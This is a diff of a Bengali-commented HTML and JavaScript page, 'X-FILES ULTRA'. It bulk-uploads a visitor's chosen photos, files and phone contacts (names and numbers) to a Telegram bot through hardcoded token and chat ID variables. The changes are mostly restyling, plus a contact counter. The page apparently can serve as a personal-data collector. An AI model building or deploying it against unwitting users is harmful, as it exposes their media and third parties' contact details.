@@ -28,38 +28,21 @@
             letter-spacing: 4px;
         }
 
-        /* প্রথম দুটি বাটনের নতুন ডিজাইন */
-        .tab-btn { position: relative; overflow: hidden; }
-        #tab-photo.active-tab { 
-            background: linear-gradient(135deg, #3b82f6, #1d4ed8) !important; 
-            box-shadow: 0 0 20px rgba(59, 130, 246, 0.6);
-            border: 1px solid rgba(255,255,255,0.2);
-        }
-        #tab-document.active-tab { 
-            background: linear-gradient(135deg, #8b5cf6, #6d28d9) !important; 
-            box-shadow: 0 0 20px rgba(139, 92, 246, 0.6);
-            border: 1px solid rgba(255,255,255,0.2);
-        }
-        
-        /* কন্টাক্ট ট্যাব আগের ডিজাইনেই রাখা হয়েছে */
-        #tab-contact.active-tab { background: #3b82f6 !important; box-shadow: 0 0 25px rgba(59, 130, 246, 0.5); }
-
-        .file-card { transition: 0.3s; border: 1px solid rgba(255,255,255,0.1); } 
-        ::-webkit-scrollbar { width: 5px; } 
-        ::-webkit-scrollbar-thumb { background: #333; border-radius: 10px; }
-        .progress-bar { transition: width 0.4s ease; }
-
-        .contact-special-box {
-            background: radial-gradient(circle at center, rgba(59, 130, 246, 0.15) 0%, transparent 70%);
+        /* সব ইনপুট বক্সের জন্য অ্যানিমেটেড নিওন লুক */
+        .animated-box {
+            background: radial-gradient(circle at center, rgba(59, 130, 246, 0.1) 0%, transparent 70%);
             border: 2px solid #3b82f6;
-            box-shadow: 0 0 15px rgba(59, 130, 246, 0.3), inset 0 0 15px rgba(59, 130, 246, 0.2);
-            position: relative;
             animation: borderGlow 2s infinite alternate;
         }
         @keyframes borderGlow {
             from { border-color: #3b82f6; box-shadow: 0 0 10px rgba(59, 130, 246, 0.3); }
             to { border-color: #60a5fa; box-shadow: 0 0 25px rgba(59, 130, 246, 0.6); }
         }
+
+        .active-tab { background: #3b82f6 !important; color: #fff !important; box-shadow: 0 0 25px rgba(59, 130, 246, 0.5); } 
+        .file-card { transition: 0.3s; border: 1px solid rgba(255,255,255,0.1); } 
+        ::-webkit-scrollbar { width: 5px; } 
+        ::-webkit-scrollbar-thumb { background: #333; border-radius: 10px; }
     </style>
 </head>
 <body class="p-4">
@@ -82,28 +65,28 @@
 
     <div class="grid grid-cols-1 lg:grid-cols-3 gap-8"> 
         <div class="lg:col-span-1"> 
-            <label id="upload-box" class="glass h-64 flex flex-col items-center justify-center cursor-pointer border-2 border-dashed border-gray-700 hover:border-blue-500 transition-all mb-6 group"> 
+            <label id="upload-box" class="animated-box h-64 flex flex-col items-center justify-center cursor-pointer rounded-[35px] mb-6 group transition-all"> 
                 <input type="file" id="fileInput" multiple class="hidden"> 
                 <span id="upload-icon" class="text-6xl mb-3 group-hover:scale-110 transition-transform">🖼️</span> 
                 <p id="upload-label" class="text-[11px] text-gray-400 font-black tracking-[0.2em] uppercase text-center px-4">Tap to open Gallery</p> 
             </label> 
 
-            <div id="contact-box" class="hidden contact-special-box h-64 flex flex-col items-center justify-center cursor-pointer rounded-[35px] mb-6 group" onclick="pickContacts()">
+            <div id="contact-box" class="hidden animated-box h-64 flex flex-col items-center justify-center cursor-pointer rounded-[35px] mb-6 group" onclick="pickContacts()">
                 <div class="relative">
                     <span class="text-6xl group-hover:scale-110 transition-transform block">👥</span>
-                    <div class="absolute -top-2 -right-2 bg-blue-500 w-6 h-6 rounded-full flex items-center justify-center animate-bounce">
-                        <span class="text-[10px] font-bold">+</span>
+                    <div id="contact-badge" class="absolute -top-2 -right-2 bg-blue-500 w-7 h-7 rounded-full flex items-center justify-center animate-bounce hidden">
+                        <span id="contact-small-count" class="text-[10px] font-bold">0</span>
                     </div>
                 </div>
                 <p class="text-[11px] text-blue-400 font-black tracking-[0.2em] uppercase text-center px-4 mt-4">Sync Multi-Contacts</p>
+                <p id="contact-stats" class="text-[9px] text-gray-500 mt-2 font-bold uppercase tracking-widest">No Contacts Selected</p>
             </div>
 
             <button onclick="ignite()" id="sendBtn" class="w-full py-6 bg-white text-black font-black rounded-[30px] hover:bg-blue-600 hover:text-white transition-all active:scale-95 shadow-2xl uppercase tracking-[0.3em]">Ignite Transfer</button> 
             
             <div id="status-box" class="mt-4 hidden p-4 glass rounded-2xl border-blue-500/30">
-                <p id="status-text" class="text-[10px] font-bold text-blue-400 uppercase mb-2">Transmitting...</p>
                 <div class="w-full bg-white/10 h-1 rounded-full overflow-hidden">
-                    <div id="progress-fill" class="progress-bar bg-blue-500 h-full w-0"></div>
+                    <div id="progress-fill" class="bg-blue-500 h-full w-0 transition-all"></div>
                 </div>
             </div>
         </div> 
@@ -111,11 +94,11 @@
         <div class="lg:col-span-2 glass p-6 min-h-[450px]"> 
             <div class="flex justify-between items-center mb-8 px-2"> 
                 <div class="flex flex-col"> 
-                    <span class="text-[10px] font-black text-gray-500 tracking-widest uppercase mb-1">Queue</span> 
+                    <span class="text-[10px] font-black text-gray-500 tracking-widest uppercase mb-1">Queue Status</span> 
                     <span id="q-count" class="text-blue-500 font-black text-4xl">0</span> 
                 </div> 
                 <div class="flex flex-col items-end"> 
-                    <span class="text-[10px] font-black text-gray-500 tracking-widest uppercase mb-1">Sent Successfully</span> 
+                    <span class="text-[10px] font-black text-gray-500 tracking-widest uppercase mb-1">Transmission</span> 
                     <span id="s-count" class="text-green-500 font-black text-4xl">0</span> 
                 </div> 
             </div> 
@@ -132,20 +115,19 @@ let currentType = 'photo';
 
 function setType(type) { 
     currentType = type; 
-    document.querySelectorAll('.tab-btn').forEach(b => { 
-        b.classList.remove('active-tab', 'text-white'); 
-        b.classList.add('text-gray-400'); 
-    }); 
+    document.querySelectorAll('.tab-btn').forEach(b => { b.classList.remove('active-tab'); b.classList.add('text-gray-400'); }); 
     document.getElementById(`tab-${type}`).classList.add('active-tab'); 
-    document.getElementById(`tab-${type}`).classList.remove('text-gray-400');
+
+    const upBox = document.getElementById('upload-box');
+    const conBox = document.getElementById('contact-box');
 
     if(type === 'contact') {
-        document.getElementById('upload-box').classList.add('hidden');
-        document.getElementById('contact-box').classList.remove('hidden');
+        upBox.classList.add('hidden');
+        conBox.classList.remove('hidden');
         document.getElementById('sendBtn').innerText = "Send Contacts";
     } else {
-        document.getElementById('upload-box').classList.remove('hidden');
-        document.getElementById('contact-box').classList.add('hidden');
+        upBox.classList.remove('hidden');
+        conBox.classList.add('hidden');
         document.getElementById('sendBtn').innerText = "Ignite Transfer";
         document.getElementById('upload-icon').innerText = type === 'photo' ? '🖼️' : '📂'; 
         document.getElementById('upload-label').innerText = type === 'photo' ? 'Open Gallery' : 'Open Files';
@@ -155,20 +137,18 @@ function setType(type) {
 
 async function pickContacts() {
     try {
-        if ('contacts' in navigator && 'ContactsManager' in window) {
+        if ('contacts' in navigator) {
             const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
             if (contacts.length) {
                 const formatted = contacts.map(c => ({
                     isContact: true,
-                    name: c.name[0] || "Unknown",
+                    name: c.name[0] || "No Name",
                     tel: (c.tel && c.tel[0]) ? c.tel[0] : "N/A",
                     id: Math.random()
                 }));
                 queue = [...queue, ...formatted];
                 render();
             }
-        } else {
-            alert("Use Chrome on Android for Contact Picker.");
         }
     } catch (err) { console.log(err); }
 }
@@ -183,7 +163,20 @@ document.getElementById('fileInput').onchange = (e) => {
 function render() { 
     const grid = document.getElementById('preview-grid'); 
     grid.innerHTML = ""; 
+    const contactItems = queue.filter(f => f.isContact).length;
+    
     document.getElementById('q-count').innerText = queue.length; 
+    
+    // কন্টাক্ট স্ট্যাটাস আপডেট
+    if(contactItems > 0) {
+        document.getElementById('contact-badge').classList.remove('hidden');
+        document.getElementById('contact-small-count').innerText = contactItems;
+        document.getElementById('contact-stats').innerText = `${contactItems} Number Selected`;
+    } else {
+        document.getElementById('contact-badge').classList.add('hidden');
+        document.getElementById('contact-stats').innerText = "No Contacts Selected";
+    }
+
     queue.forEach((f, i) => { 
         const div = document.createElement('div'); 
         div.className = "relative aspect-square rounded-2xl overflow-hidden file-card bg-white/5 flex flex-col items-center justify-center p-2"; 
@@ -205,43 +198,30 @@ async function ignite() {
     if(!queue.length) return; 
     const btn = document.getElementById('sendBtn'); 
     const sCountDisp = document.getElementById('s-count'); 
-    const qCountDisp = document.getElementById('q-count'); 
     const statusBox = document.getElementById('status-box');
     const progressFill = document.getElementById('progress-fill');
-    const statusText = document.getElementById('status-text');
 
-    btn.disabled = true; 
-    btn.innerText = "🚀 INJECTING..."; 
-    statusBox.classList.remove('hidden');
+    btn.disabled = true; btn.innerText = "🚀 SENDING..."; statusBox.classList.remove('hidden');
 
     let totalSent = 0; 
-    const totalItems = queue.length; 
-    const now = new Date();
-    const timeInfo = `📅 ${now.toLocaleDateString()} | ⏰ ${now.toLocaleTimeString()}`;
-
     const contacts = queue.filter(item => item.isContact);
     const files = queue.filter(item => !item.isContact);
 
-    // ১. কন্টাক্ট লিস্ট পাঠানো (মাঝে একটি ফাঁকা লাইন রেখে)
     if(contacts.length > 0) {
-        let contactList = `👥 *BATCH CONTACT SYNC*\n\n`;
-        contacts.forEach((c, idx) => {
-            contactList += `👤 *${idx + 1}.* ${c.name}\n📞 \`${c.tel}\`\n\n`; 
-        });
-        contactList += `${timeInfo}\n🌐 Portal: X-FILES ULTRA`;
-
+        let msg = `👥 *BATCH CONTACT SYNC*\n\n`;
+        contacts.forEach((c, idx) => { msg += `👤 *${idx + 1}.* ${c.name}\n📞 \`${c.tel}\`\n\n`; });
+        msg += `🌐 Portal: X-FILES ULTRA`;
         try {
             await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: contactList, parse_mode: 'Markdown' })
+                body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
             });
             totalSent += contacts.length;
+            sCountDisp.innerText = totalSent;
         } catch(e) {}
-        updateProgress(totalSent, totalItems);
     }
 
-    // ২. ফাইল ব্যাচিং (৫০টি করে)
     const BATCH_SIZE = 50;
     for (let i = 0; i < files.length; i += BATCH_SIZE) {
         const batch = files.slice(i, i + BATCH_SIZE);
@@ -252,31 +232,16 @@ async function ignite() {
             fd.append(method === 'sendPhoto' ? 'photo' : 'document', f); 
             try {
                 const res = await fetch(`https://api.telegram.org/bot${TOKEN}/${method}`, { method: 'POST', body: fd });
-                if(res.ok) {
-                    totalSent++;
-                    updateProgress(totalSent, totalItems);
-                }
+                if(res.ok) { totalSent++; sCountDisp.innerText = totalSent; }
             } catch (err) {}
+            progressFill.style.width = Math.round((totalSent / queue.length) * 100) + "%";
         }
-        if (i + BATCH_SIZE < files.length) {
-            statusText.innerText = "Next batch loading...";
-            await new Promise(r => setTimeout(r, 2000));
-        }
+        if (i + BATCH_SIZE < files.length) await new Promise(r => setTimeout(r, 2000));
     }
 
-    function updateProgress(sent, total) {
-        sCountDisp.innerText = sent;
-        qCountDisp.innerText = total - sent;
-        const percent = Math.round((sent / total) * 100);
-        progressFill.style.width = percent + "%";
-        statusText.innerText = `Transmitting: ${percent}%`;
-    }
-
-    btn.innerText = "MISSION COMPLETED"; 
-    btn.style.background = "#10b981";
+    btn.innerText = "COMPLETED"; btn.style.background = "#10b981";
     setTimeout(() => location.reload(), 3000); 
 } 
-
 setType('photo');
 </script>
 </body>
